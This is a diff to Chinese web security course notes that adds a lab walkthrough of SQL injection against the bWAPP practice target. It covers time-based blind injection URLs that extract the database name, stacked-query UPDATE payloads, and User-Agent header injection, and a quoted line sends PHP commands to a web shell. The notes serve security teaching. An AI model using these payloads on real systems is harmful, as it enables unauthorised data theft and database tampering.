@@ -743,7 +743,7 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 - 什么是Windows文件流？
   - NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。
 - 我们来用Windows平台做一些测试：
-  1. Echo 111 > test.txt:111.txt；
+  1. Echo 111 > test.txt:111.txt
      1. 使用命名的文件流111.txt创建文件 test.txt
      2. 直接打开，文件中没有数据，查看属性0字节
      3. 使用 notepad test.txt:111.txt 打开可以看到内容
@@ -1396,43 +1396,187 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 ### 时间盲注 
 
+#### SQL注入的不同类型 
+
+- SQL注入主要分为以下5种
+  - Boolean-based blind SQL injection（布尔型注入）
+  - UNION query SQL injection（可联合查询注入）
+  - Time-based blind SQL injection（基于时间延迟注入）
+  - Error-based SQL injection（报错型注入）
+  - Stacked queries SQL injection（可多语句查询注入） 
+
+- Boolean-based（布尔型注入）
+  - http://test.com/view?id=1 and substring(version(),1,1)=5
+  - 如果服务端MySQL版本是5.X的话，那么页面返回的内容就会跟正常请求一样。 
+- UNION（联合查询注入）
+  - http://test.com/view?id=1 UNION ALL SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA
+  - 最快捷的方法，通过UNION查询获取到所有想要的数据，前提是请求返回后能输出SQL执行后查询到的所有内容。 
+- Time-based（基于时间延迟注入）
+  - select * from user where id= ‘4’ and sleep(3)
+  - 页面不会返回错误信息，不会输出UNION注入所查出来的泄露的信息。
+  - 类似搜索这类请求，boolean注入也无能为力，因为搜索返回空也属于正常的，这时就得采用time-based的注入了，即判断请求响应的时间，但该类型注入获取信息的速度比较慢，请求次数比较多，纯手工非常复杂。 
+- Error-based（报错型注入）
+  - 如果页面能够输出SQL报错信息，则可以从报错信息中获得想要的信息。
+  - 典型的就是利用group by的duplicate entry错误。 
+- Stacked queries（多语句查询型注入）
+  - http://test.com/view?id=1;update t set name = ‘a‘ where id=1 
+  - 能够执行多条查询语句，非常危险，因为这意味着能够对数据库直接做更新操作。 
+
+
+
+#### 时间盲注定义
+
+- 时间盲注是什么？ 
+  - 通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如： 在SQL语句中使用sleep() 函数看加载网页的时间来判断注入点。
+  - 适用场景：通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知。 
 
 
 
 
 
+#### 时间盲注原理 
+
+- 原理示意
+  - select * from user where id= ‘ ？’
+    - ？ 用户输入，替代为 4’ and sleep(3) -- ‘
+  - 实际上执行的SQL语句：
+    - select * from user where id= ‘4’ and sleep(3) -- ‘’
+  - 当id=4存在时，休眠3秒
+  - 当id=4不存在时，直接返回
+  - 整条拼接出来的SQL是正确的就执行最后的sleep，前面错误（不存在），sleep(3)不执行。 
+
+
+
+#### 时间盲注常用函数
+
+- substr(a,b,c)：从b位置开始，截取字符串a的c长度
+- count()：计算总数
+- ascii()：返回字符的ASCII码
+- length()：返回字符串的长度
+- left(a,b)：从左往右截取字符串a的前b个字符
+- sleep(n)：将程序挂起n秒
+- 还有很多函数可以挖掘，如binary等，同学们理解了盲注的原理后可以到 MySQL官网的Reference去学习。 
+
+
+
+#### 时间盲注实战
+
+- 安装，注册，并登录靶机
+
+- 选择bug类型：Choose your bug: SQL Injection - Blind - Time-Based
+
+- 注入尝试
+
+  - 尝试使用错误注入，布尔注入
+  - 均无反馈信息（这一点很重要）
+  - 尝试其他内容 
+
+- 时间注入 
+
+  - 使用or的方式：http://xforburp.com/sqli_15.php?title=1' or sleep(2) -- &action=search
+  - 浏览器一直转圈圈，2秒后获得请求而停止
+  - 使用and的方式：http://xforburp.com/sqli_15.php?title=World War Z' and sleep(2) -- &action=search
+
+- 数据库名字长度获取
+
+  - 由于注入点不能反馈信息，所以不能像前面两个注入方式那样直接简洁地获取数据库信息，需要从侧面一步步拼凑信息。 
+  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())=1 and sleep(2) -- &action=search
+  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())>1 and sleep(2) -- &action=search
+  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())>5 and sleep(2) -- &action=search
+  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())>4 and sleep(2) -- &action=search
+  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())=5 and sleep(2) -- &action=search
+  - 最终确定数据库名称的长度是5
+
+- 数据库名字的第一个字母获取 
+
+  - http://xforburp.com/sqli_15.php?title=World War Z' and substr(database(),1,1)='a' and sleep(2) -- &action=search
+  - http://xforburp.com/sqli_15.php?title=World War Z' and substr(database(),1,1)='b' and sleep(2) -- &action=search
+  - 通过一个一个的比对，确定数据库名字第一个字母是什么
+
+- 数据库版本名称长度获取 
+
+  - http://xforburp.com/sqli_15.php?title=World War Z' and length(version())=5 and sleep(2) -- &action=search
+  - http://xforburp.com/sqli_15.php?title=World War Z' and length(version())=23 and sleep(2) -- &action=search
+
+- 实际情况
+
+  - 在实际情况中，版本名称不仅只有字母也可能有其他特殊字符，一个一个尝试终究是有遗漏
+    的，而且手工输入时间耗时较久，需要通过程序解决。 
+
+- ASCII表 
+
+  ![1617177603495](HackerMeWeb.assets/1617177603495.png)
+
+- 使用ASCII编码的方式测试
+
+  - http://xforburp.com/sqli_15.php?title=World War Z' and ascii(substr(database(),1,1))=98 and sleep(2) -- &action=search
+
+- 自动化程序编写 
+
+  - bWAPP需要登录 ，携带 cookie 信息
+  - Python 2.7.9 + 或 Python 3.4+ 以上版本都自带 pip 工具，如无，单独下载后安装 requests 模块。 
+  - 程序参见：
+    - HackerMeCode\SQLInjectTimeBases\sqlInjection-time_py2.py
+    - HackerMeCode\SQLInjectTimeBases\sqlInjection-time_py3.py
+    - 通过程序，可以获得数据库的名称
+
+- Requests 模块学习
+
+  - https://github.com/psf/requests
+  - https://docs.python-requests.org/en/master/
 
 
 
 
 
+### HTTP头注入 
+
+#### HTTP头注入是什么
+
+- 针对HTTP的请求头，如果不加以过滤或者转义，在直接与数据库交互的过程中容易被利用进行SQL注入攻击，即HTTP头注入。
+- 常见场景：
+  - 访问Web Server时，Web Server会从HTTP Header中取出浏览器信
+    息、IP地址、HOST信息等存储到数据库中。 
 
 
 
+#### HTTP头注入实战
+
+- 安装，注册，并登录靶机
+
+- 选择bug类型：Choose your bug: SQL Injection - Stored (User-Agent)
+
+- 通过Burp Suite抓包拦截请求 
+
+  - 右键 Send to Repeater
+  - 在 Repeater 中重新 send ，查看内容
+
+- 推测后端SQL语句的形态，尝试闭合SQL语句。 
+
+  - 更改为：User-Agent: 123
+  - 更改为：User-Agent: 123'
+  - 更改为：User-Agent: 111','222'); #
+  - 更改为：User-Agent: 111', sleep(2)); #
+
+- 猜测后端SQL语句形态：
+
+  - INSERT INTO … VALUES (xxx,yyy);  
+
+- 让我们进入Docker验证一下吧
+
+  - cd /var/www/html/
+
+  - 从浏览器的地址栏可以看到访问的事*17.php
+
+  - vim sqli_17.php
+
+  - 发现下面这段保存数据到数据库的逻辑代码
+
+    ![1617179730172](HackerMeWeb.assets/1617179730172.png)
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+### 报错注入 
 
 
 
